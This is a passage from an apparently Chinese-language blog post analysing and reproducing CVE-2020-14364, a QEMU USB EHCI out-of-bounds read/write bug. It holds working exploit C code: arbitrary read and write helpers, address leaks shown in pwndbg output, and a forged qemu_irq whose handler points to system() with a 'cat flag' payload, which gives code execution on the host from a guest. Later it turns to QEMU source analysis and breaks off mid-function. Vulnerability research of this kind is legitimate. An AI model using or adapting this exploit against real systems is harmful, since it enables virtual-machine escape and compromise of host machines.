class="line">pwndbg&gt; p/x <span class="number">0x5555576b6898</span><span class="number">-0x5555576b539c</span><span class="number">-0x1000</span></span><br><span class="line">$<span class="number">51</span> = <span class="number">0x4fc</span></span><br></pre></td></tr></table></figure><p>因此在第一步结束之后我们得到了<code>port/data_buf</code>等<code>USBDevice</code>成员变量的地址以及<code>system.plt</code>的地址。</p><h3 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h3><p>这一步是为了获取<code>EHCIState</code>结构体的地址，我们看一下这一部分的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Step 2/3\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">anywhere_read(port_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">  <span class="type">uint64_t</span> tmp = second_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">  port_ptr |= tmp &lt;&lt; ((i) * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] port ptr : 0x%lx\033[0m\n&quot;</span>,port_ptr);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> EHCIState_addr = port_ptr - <span class="number">0x530</span>;</span><br><span class="line"><span class="type">uint64_t</span> irq_addr = EHCIState_addr + <span class="number">0xb8</span>;</span><br><span class="line"><span class="type">uint64_t</span> fake_irq_addr = data_buf_addr;</span><br><span class="line"><span class="type">uint64_t</span> irq_ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">anywhere_read(irq_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">  <span class="type">uint64_t</span> tmp = second_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">  irq_ptr |= tmp &lt;&lt; ((i) * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Port ptr : 0x%lx\033[0m\n&quot;</span>,port_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] EHCIState addr : 0x%lx\033[0m\n&quot;</span>,EHCIState_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] IRQ addr : 0x%lx\033[0m\n&quot;</span>,irq_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Fake IRQ addr : 0x%lx\033[0m\n&quot;</span>,fake_irq_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] IRQ ptr : 0x%lx\033[0m\n&quot;</span>,irq_ptr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x28</span>) = system_addr;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x30</span>) = device_addr+<span class="number">0xdc</span>+<span class="number">0x100</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x38</span>) = <span class="number">0x3</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(data_buf + <span class="number">0x100</span>) = <span class="number">0x67616c6620746163</span>;</span><br></pre></td></tr></table></figure><p>首先是调用了任意读的函数读取了我们在第一步中泄漏的<code>port</code>的地址中存储的内容。我们先来看一下<code>anywhere_read</code>函数的逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">anywhere_read</span><span class="params">(<span class="type">uint64_t</span> target_addr)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] Anywhere Read\033[0m&quot;</span>);</span><br><span class="line">    <span class="comment">//set_length(0x1010);</span></span><br><span class="line">    oob_write(<span class="number">0x0</span>,<span class="number">0x1010</span>,<span class="number">0xfffffff8</span><span class="number">-0x1010</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf) = <span class="number">0x2000000000000080</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> target_offset = target_addr - data_buf_addr;</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0x8</span>,<span class="number">0xffff</span>,target_offset - <span class="number">0x1018</span>,<span class="number">0</span>);</span><br><span class="line">    oob_read(<span class="number">0x2000</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先调用越界写函数覆写<code>setup_len</code>和<code>setup_index</code>。这里我们看一下<code>oob_write</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">oob_write</span><span class="params">(<span class="type">uint64_t</span> offset,<span class="type">uint64_t</span> setup_len,<span class="type">uint64_t</span> setup_index,<span class="type">int</span> perpare)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(perpare)&#123;</span><br><span class="line">        perpare_write();</span><br><span class="line">        set_length(<span class="number">0x1010</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] prepare write finished\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_bufoob + offset) = <span class="number">0x0000000200000002</span>; <span class="comment">// 覆盖成原先的内容</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">int</span> *)(data_bufoob + <span class="number">0x8</span> +offset) = setup_len; <span class="comment">//setup_len</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">int</span> *)(data_bufoob + <span class="number">0xc</span>+ offset) = setup_index;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">0x1e00</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">0</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(data_buf);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virtuak_addr_to_physical_addr(data_bufoob);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同<code>oob_read</code>函数相同，在调用<code>read</code>之后的第一个<code>write</code>函数的时候需要将<code>perpare</code>位置为<code>1</code>表示需要设置一下<code>s-&gt;setup_state</code>以顺利的进入<code>do_token_out</code>的写操作部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line"><span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">  len = p-&gt;iov.size;</span><br><span class="line">&#125;</span><br><span class="line">usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br></pre></td></tr></table></figure><p>我们看到这里还是将<code>setup_len</code>于<code>iov.size</code>对比了一下选择两者之间最小的进行覆写，这里在函数中是写死的。因此这里实际上写入的字节大小就是<code>len</code>的值也就是<code>0x1010</code>字节大小。溢出的<code>0x10</code>字节的写用来覆写<code>setup_len/setup_index</code>为指定的数值。</p><p>那么在任意写函数调用了第一次越界写入函数覆写完毕<code>setup_len/setup_index</code>之后<code>setup_index</code>要加上写入的字节数，此时的<code>setup_index=-8</code>。接着再一次调用了越界写函数，此时写入的目标地址就是<code>setup_buf</code>开始的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x s-&gt;setup_index</span><br><span class="line">$<span class="number">2</span> = <span class="number">0xfffffff8</span></span><br></pre></td></tr></table></figure><p>在这里将<code>setup_buf</code>覆写为了<code>read</code>函数调用所需要的数值，并将<code>setup_len</code>覆写为了<code>0xffff</code>，<code>setup_index</code>覆写为了<code>offset-0x1018</code>，那么此次的越界写写入的字节数为<code>0x1018</code>大小，覆写结束之后<code>setup_index</code>就变成了<code>offset</code>即<code>target_addr - data_buf_addr</code>，那么下一次的读函数的调用就是从<code>target_addr</code>开始读取数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x s-&gt;setup_index</span><br><span class="line">$<span class="number">4</span> = <span class="number">0xffffff9c</span></span><br><span class="line">pwndbg&gt; p/x s-&gt;setup_buf</span><br><span class="line">$<span class="number">5</span> = &#123;<span class="number">0x80</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x20</span>&#125;</span><br><span class="line">pwndbg&gt; p &amp;s-&gt;data_buf</span><br><span class="line">$<span class="number">6</span> = (<span class="type">uint8_t</span> (*)[<span class="number">4096</span>]) <span class="number">0x5555576b539c</span></span><br><span class="line">pwndbg&gt; p &amp;s-&gt;port</span><br><span class="line">$<span class="number">7</span> = (USBPort **) <span class="number">0x5555576b5338</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x5555576b5338</span> - <span class="number">0x5555576b539c</span></span><br><span class="line">$<span class="number">8</span> = <span class="number">0xffffffffffffff9c</span></span><br></pre></td></tr></table></figure><p>那么接下来调用越界读函数就可以读取出<code>port</code>中存储的指针的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p s-&gt;port</span><br><span class="line">$<span class="number">10</span> = (USBPort *) <span class="number">0x55555762ea80</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x55555762ea80</span></span><br><span class="line"><span class="number">0x55555762ea80</span>: <span class="number">0x00005555576b52c0</span>      <span class="number">0x0000000000000004</span></span><br></pre></td></tr></table></figure><p>从该值我们可以推测出<code>EHCIState</code>结构体的地址，因为此值就是<code>EHCIState</code>中的<code>ports</code>的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;((<span class="keyword">struct</span> EHCIState*)<span class="number">0</span>)-&gt;ports</span><br><span class="line">$<span class="number">26</span> = (USBPort (*)[<span class="number">6</span>]) <span class="number">0x540</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x55555762ea80</span><span class="number">-0x540</span></span><br><span class="line">$<span class="number">27</span> = <span class="number">0x55555762e540</span></span><br><span class="line">pwndbg&gt; p &amp;((<span class="keyword">struct</span> EHCIState *)<span class="number">0x55555762e540</span>).ports</span><br><span class="line">$<span class="number">28</span> = (USBPort (*)[<span class="number">6</span>]) <span class="number">0x55555762ea80</span></span><br><span class="line">pwndbg&gt; p s-&gt;port</span><br><span class="line">$<span class="number">29</span> = (USBPort *) <span class="number">0x55555762ea80</span></span><br></pre></td></tr></table></figure><p>那么得到该结构体的地址之后我们就可以得到<code>irq</code>成员变量的地址。之后读取了<code>irq</code>成员变量里面存储的值，但是我现在还不知道该值有什么作用。</p><p>还差一点就是为什么这两个<code>ports</code>的值相同。这里我们需要深入的分析一下<code>usb_claim_prot</code>这个函数，这个之后再进行分析。</p><h3 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h3><p>目前我们已经知道了<code>EHCIState</code>结构体的地址，那么接下来就是要伪造一个<code>qemu_irq</code>结构体将<code>handler</code>设置为<code>system.plt</code>的地址将<code>opaque</code>设置为<code>payload</code>的地址，覆写<code>EHCIState-&gt;irq</code>指针为我们伪造的结构体的地址，那么之后发生的<code>irq-&gt;handler(irq-&gt;opaque)</code>的调用就可以执行我们的<code>payload</code>了。看一下这里的<code>exp</code>代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x28</span>) = system_addr;<span class="comment">// handler指针</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x30</span>) = device_addr+<span class="number">0xdc</span>+<span class="number">0x100</span>;<span class="comment">// opaque指针指向data_buf+0x100的位置</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x38</span>) = <span class="number">0x3</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(data_buf + <span class="number">0x100</span>) = <span class="number">0x67616c6620746163</span>; <span class="comment">//payload</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Step 3/3\033[0m\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line">oob_write(<span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0xffff</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">anywhere_write(irq_addr, fake_irq_addr,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这里首先是覆写了<code>setup_len,setup_index</code>，这一步好像是没什么用，接着就直接覆写了<code>EHCIState-&gt;irq</code>这个指针为我们伪造的<code>qemu_irq</code>结构体的地址。这里我们看一下任意地址写函数<code>anywhere_write</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">anywhere_write</span><span class="params">(<span class="type">uint64_t</span> target_addr,<span class="type">uint64_t</span> payload,<span class="type">int</span> flag)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] Anywhere Write\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> offset = target_addr - data_buf_addr;</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0</span>, offset+<span class="number">0x8</span>, offset<span class="number">-0x1010</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Hacked!\033[0m\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf) = payload;</span><br><span class="line">    oob_write(<span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先函数利用越界写设置<code>setup_len,setup_index</code>。但是由于越界写入指定了写入的字节的大小就是<code>0x1010</code>，因此这里在第一次越界写入之后就<code>setup_index</code>就会变成<code>offset</code>，下一次的越界写入就从<code>target_addr</code>开始写入<code>0x1010</code>大小的字节了，并且这里写入的源地址是<code>data_buf</code>指针指向的内容。因此这里就实现了任意写。</p><p>并且最后一个任意写在这里还存在一个功能就是触发<code>qemu_set_irq</code>函数，由于此时任意写的<code>addr=0</code>，那么在<code>echi_opreg_write</code>函数中走入的分支就是<code>USBCMD</code>也就是覆写<code>usbcmd</code>成员变量，但是这里会调用一个<code>echi_reset</code>函数，那么就会发生如下的函数调用链<code>ehci_reset-&gt;usb_detach-&gt;ehci_detach-&gt;ehci_raise_irq-&gt;ehci_update_irq-&gt;qemu_set_irq</code></p><p>最终就会调用<code>irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);</code>也就是会执行我们的<code>payload</code>。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2020-14364-QEMU-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/image-20210320154514980.png" alt="图片无法显示，请联系作者" title=" "><p>那么由于这里我是在<code>docker</code>中进行调试的，因此这里我将弹出计算器的操作改成了读取<code>flag</code>。</p><h2 id="iov-size"><a href="#iov-size" class="headerlink" title="iov.size"></a>iov.size</h2><p>对于<code>iov</code>的赋值是从<code>qemu_iovec_add</code>函数开始的，发生如下的函数调用链<code>echi_execute-&gt;usb_packet_map-&gt;qemu_iovec_add</code>，我们看一下该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QEMUIOVector</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov</span>;</span></span><br><span class="line">    <span class="type">int</span> niov;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">int</span> nalloc;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">local_iov</span>;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">char</span> __pad[<span class="keyword">sizeof</span>(<span class="type">int</span>) + offsetof(<span class="keyword">struct</span> iovec, iov_len)];</span><br><span class="line">            <span class="type">size_t</span> size;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; QEMUIOVector;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *iov_base;</span><br><span class="line">    <span class="type">size_t</span> iov_len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// qemu_iovec_add(&amp;p-&gt;iov, mem, xlen);</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">qemu_iovec_add</span><span class="params">(QEMUIOVector *qiov, <span class="type">void</span> *base, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(qiov-&gt;nalloc != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (qiov-&gt;niov == qiov-&gt;nalloc) &#123;</span><br><span class="line">        qiov-&gt;nalloc = <span class="number">2</span> * qiov-&gt;nalloc + <span class="number">1</span>;</span><br><span class="line">        qiov-&gt;iov = g_renew(<span class="keyword">struct</span> iovec, qiov-&gt;iov, qiov-&gt;nalloc);</span><br><span class="line">    &#125;</span><br><span class="line">    qiov-&gt;iov[qiov-&gt;niov].iov_base = base;</span><br><span class="line">    qiov-&gt;iov[qiov-&gt;niov].iov_len = len;</span><br><span class="line">    qiov-&gt;size += len;</span><br><span class="line">    ++qiov-&gt;niov;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的<code>base</code>是一个物理地址，<code>len</code>是长度。可以看到这里对<code>iov</code>的所有变量进行了赋值。<code>qiov</code>是一个<code>QEMUIOVector</code>结构体，该结构体中的第一个成员变量<code>iov</code>是一个<code>iovc</code>结构体指针数组。<code>niov</code>表示的是数组下标即<code>index</code>。我们看一下<code>qemu_iovec_add</code>函数的上层函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ScatterGatherEntry</span> &#123;</span></span><br><span class="line">    <span class="type">dma_addr_t</span> base;</span><br><span class="line">    <span class="type">dma_addr_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUSGList</span> &#123;</span></span><br><span class="line">    ScatterGatherEntry *sg;</span><br><span class="line">    <span class="type">int</span> nsg;</span><br><span class="line">    <span class="type">int</span> nalloc;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    DeviceState *dev;</span><br><span class="line">    AddressSpace *as;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">usb_packet_map</span><span class="params">(USBPacket *p, QEMUSGList *sgl)</span></span><br><span class="line">&#123;</span><br><span class="line">    DMADirection dir = (p-&gt;pid == USB_TOKEN_IN) ?</span><br><span class="line">        DMA_DIRECTION_FROM_DEVICE : DMA_DIRECTION_TO_DEVICE;</span><br><span class="line">    <span class="type">void</span> *mem;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sgl-&gt;nsg; i++) &#123;</span><br><span class="line">        <span class="type">dma_addr_t</span> base = sgl-&gt;sg[i].base;</span><br><span class="line">        <span class="type">dma_addr_t</span> len = sgl-&gt;sg[i].len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (len) &#123;</span><br><span class="line">            <span class="type">dma_addr_t</span> xlen = len;</span><br><span class="line">            mem = dma_memory_map(sgl-&gt;as, base, &amp;xlen, dir);</span><br><span class="line">            <span class="keyword">if</span> (!mem) &#123;</span><br><span class="line">                <span class="keyword">goto</span> err;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (xlen &gt; len) &#123;</span><br><span class="line">                xlen = len;</span><br><span class="line">            &#125;</span><br><span class="line">            qemu_iovec_add(&amp;p-&gt;iov, mem, xlen);</span><br><span class="line">            len -= xlen;</span><br><span class="line">            base += xlen;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">    usb_packet_unmap(p, sgl);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们看到函数传入参数<code>mem,xlen</code>是由<code>sgl</code>这个数据结构体得来的。根据<code>nsg</code>的值依次添加相应的<code>iov</code>。我们看一下<code>sgl</code>的赋值过程。该结构体其实是从<code>ehci_init_transfer</code>函数中生成的，发生了如下的函数调用链<code>ehci_execute-&gt;ehci_init_transfer-&gt;qemu_sglist_add</code>，我们先来看一下<code>qemu_sglist_add</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">qemu_sglist_add</span><span class="params">(QEMUSGList *qsg, <span class="type">dma_addr_t</span> base, <span class="type">dma_addr_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (qsg-&gt;nsg == qsg-&gt;nalloc) &#123;</span><br><span class="line">        qsg-&gt;nalloc = <span class="number">2</span> * qsg-&gt;nalloc + <span class="number">1</span>;</span><br><span class="line">        qsg-&gt;sg = g_realloc(qsg-&gt;sg, qsg-&gt;nalloc * <span class="keyword">sizeof</span>(ScatterGatherEntry));</span><br><span class="line">    &#125;</span><br><span class="line">    qsg-&gt;sg[qsg-&gt;nsg].base = base;</span><br><span class="line">    qsg-&gt;sg[qsg-&gt;nsg].len = len;</span><br><span class="line">    qsg-&gt;size += len;</span><br><span class="line">    ++qsg-&gt;nsg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到函数的逻辑和<code>qemu_iovec_add</code>函数的逻辑类似，我们看一下上层函数<code>base,len</code>的赋值过程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_init_transfer</span><span class="params">(EHCIPacket *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> cpage, offset, bytes, plen;</span><br><span class="line">    <span class="type">dma_addr_t</span> page;</span><br><span class="line">  </span><br><span class="line">  <span 